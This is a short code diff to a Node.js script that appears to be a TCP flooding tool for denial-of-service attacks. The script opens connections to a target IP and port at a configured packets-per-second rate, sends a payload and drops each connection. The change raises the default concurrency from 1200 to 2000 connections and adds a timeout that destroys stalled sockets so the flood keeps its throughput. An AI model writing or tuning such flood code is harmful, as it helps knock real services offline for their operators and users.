@@ -7,7 +7,7 @@ const crypto = require('crypto');
 const PORT = Number(process.env.PORT || process.env.SERVER_PORT || 3000);
 const MAX_RATE = Number(process.env.MAX_PPS || 60000);
 const NSOCK = 12;
-const CONC = Number(process.env.CONC || 1200);
+const CONC = Number(process.env.CONC || 2000);
 
 const st = { run: false, sent: 0, t0: 0, dur: 1, proto: 'tcp' };
 let socks = [], timer = null;
@@ -85,13 +85,14 @@ function startTcp(ip, port, dur) {
     active++;
     const s = net.connect(port, ip);
     s.setNoDelay(true);
+    const guard = setTimeout(() => { try { s.destroy(); } catch {} }, 3000);
     s.on('connect', () => {
       st.sent++;
       s.write(PAY);
       s.destroy();
     });
     s.on('error', () => {});
-    s.on('close', () => { active--; });
+    s.on('close', () => { clearTimeout(guard); active--; });
   }
 
   function pump() {
